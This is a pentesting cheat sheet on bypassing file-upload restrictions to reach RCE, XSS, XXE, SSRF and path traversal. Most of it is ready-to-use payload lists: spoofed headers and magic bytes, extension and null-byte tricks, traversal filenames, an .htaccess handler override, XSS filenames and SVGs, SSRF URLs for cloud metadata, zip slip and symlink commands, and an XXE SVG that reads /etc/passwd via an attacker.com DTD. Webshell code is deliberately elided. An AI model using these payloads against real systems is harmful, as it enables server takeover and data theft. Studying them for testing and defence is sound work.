# 18. File Upload Vulnerabilities

A complete reference of techniques to bypass file-upload restrictions and pivot the upload to RCE, XSS, XXE, SSRF, or path traversal.

> **Note on payloads.** Concrete webshell strings, ASP shell snippets and CSV DDE formulas have been intentionally elided in this document to keep antivirus from flagging the repository. Where you see `WEBSHELL_PHP`, `WEBSHELL_ASP`, `DDE_FORMULA`, etc., consult the references at the bottom of this page for actual payloads — or write your own from the description provided.

## Content-Type tampering

When the file extension is blocked, swap the `Content-Type` header to a benign-looking value:

```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/x-shockwave-flash
Content-Type: text/plain
```

While keeping the file extension as `.php`, `.jsp`, `.aspx`, etc.

## Magic bytes / file signature

Some servers check the first bytes of the file to identify the file type. Insert valid magic bytes at the start of your malicious payload:

```
GIF89a;
<WEBSHELL_PHP>
```

Common magic bytes:

```
PNG  -> 89 50 4E 47 0D 0A 1A 0A
JPG  -> FF D8 FF E0
GIF  -> 47 49 46 38 39 61    (GIF89a)
PDF  -> 25 50 44 46          (%PDF)
ZIP  -> 50 4B 03 04          (PK..)
```

## Extension manipulation

Try every PHP extension variation that the server might still execute:

```
shell.php
shell.PHP
shell.PhP
shell.pHp
shell.phtml
shell.phar
shell.phps
shell.pht
shell.phpt
shell.php3
shell.php4
shell.php5
shell.php6
shell.php7
shell.inc
```

## Null-byte injection (`%00`)

Older / poorly written servers stop reading the filename at a null byte:

```
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
```

## Double extensions

Some configurations only check the last extension or the first extension:

```
shell.php.jpg
shell.jpg.php
shell.php.gif
shell.php.png
```

## Reverse double extension

```
shell.jpg.php
shell.png.php
shell.gif.php
```

## Multiple dots

```
shell.php.....
shell.....php
```

## Trailing characters

```
shell.php.
shell.php/
shell.php%20
shell.php%0d
shell.php%0a
shell.php#
shell.php?
shell.php;.jpg
shell.php:.jpg     (NTFS alternate data stream)
```

## Mixed case

```
shell.PhP
shell.PHP
shell.pHp
shell.PHP5
shell.PHTML
```

## Content sniffing — `Content-Type` mismatch

If the server uses `Content-Type` to decide where the file is stored, but the application later renders based on extension:

```
filename = "shell.php"
Content-Type: image/png
```

## Path traversal in filename

```
filename=../../../../var/www/html/shell.php
filename=..%2f..%2f..%2fshell.php
filename=....//....//....//shell.php
filename=..%252f..%252f..%252fshell.php
```

## RCE via `.htaccess` upload

Upload a malicious `.htaccess` to make Apache execute arbitrary file extensions as PHP:

```
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
```

Then upload `shell.jpg` containing PHP code.

## RCE via `web.config` (IIS)

Upload a malicious `web.config` that registers a custom handler for an extension you can also upload, then upload an ASP/ASPX shell with that extension. References below describe the exact `<handlers>` and `<requestFiltering>` blocks needed.

## RCE via SVG / XSS / XXE

SVG files are often allowed because they are images, but they execute JavaScript and parse XML.

XXE inside an SVG:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;]>
<svg xmlns="http://www.w3.org/2000/svg">
   <text>&send;</text>
</svg>
```

XSS via SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
   <text>XSS</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
   <script>alert(1)</script>
</svg>
```

## RCE via ImageTragick (CVE-2016-3714)

If the server uses ImageMagick to process uploads, embed the payload inside an MVG / SVG file. The attack abuses ImageMagick's URL-handler parsing inside `fill 'url(...)'` directives. See the original CVE-2016-3714 advisory for the exact payload.

## ZIP / archive attacks

### Zip Slip — path traversal during extraction

```
zip -y archive.zip "../../../../tmp/evil.txt"
```

### ZIP bomb

A small zip file expands to gigabytes / petabytes when extracted. Use this for DoS testing.

### ZIP-symlink attack

```
ln -s /etc/passwd link
zip --symlink archive.zip link
```

After extraction, reading "link" reads `/etc/passwd`.

## Excel / CSV injection

Upload a `.csv` or `.xlsx` containing DDE / formula payloads. When opened by an admin in Excel, the formula executes a command (e.g. invokes `cmd.exe`, runs PowerShell, or pulls a remote payload). Common starting characters that Excel treats as a formula:

```
=
+
-
@
0x09  (TAB)
0x0D  (CR)
```

Wrap your `cmd` command after these starters as `DDE_FORMULA`. Reference: OWASP "CSV Injection" page.

## XSS via filename

If the filename is reflected on the page, inject XSS into it:

```
"><svg/onload=alert(1)>.jpg
"><img src=x onerror=alert(1)>.png
'+alert(1)+'.gif
```

## XXE in DOCX / ODT / SVG / XML uploads

Office formats are zip files containing XML. Inject an XXE payload in `word/document.xml` and re-zip:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

## SSRF via image fetch

Some applications "fetch from URL" instead of accepting raw uploads. Provide a URL that points to internal services:

```
http://169.254.169.254/latest/meta-data/   (AWS metadata)
http://localhost:6379/                     (Redis)
http://127.0.0.1:8080/admin                (internal admin)
file:///etc/passwd                         (file scheme)
gopher://127.0.0.1:25/...                  (Gopher SMTP)
```

## RCE via deserialization in profile-pic uploads

If the uploaded file is later deserialized (e.g. via `pickle`, `unserialize`, Java `readObject`), craft a deserialization payload disguised as an image (with valid magic bytes) and watch for command execution. Tools like `ysoserial` (Java) and `phpggc` (PHP) automate gadget-chain construction.

## DoS via decompression bomb

For PNG / JPEG, send images with extreme dimensions (e.g. 100000 × 100000). Image-resizing libraries allocate RAM proportional to width × height — easy memory-exhaustion DoS.

## Unrestricted file size

Always test what happens when you upload a file that is larger than what the application expects. Some servers crash, expose stack traces, or fill the disk.

## Race condition during upload

Upload a malicious file and immediately request it before the server's antivirus / cleanup job runs. With careful timing you can execute code before the file is deleted or sanitized.

## References

- [OWASP — File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings — Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [OWASP — CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
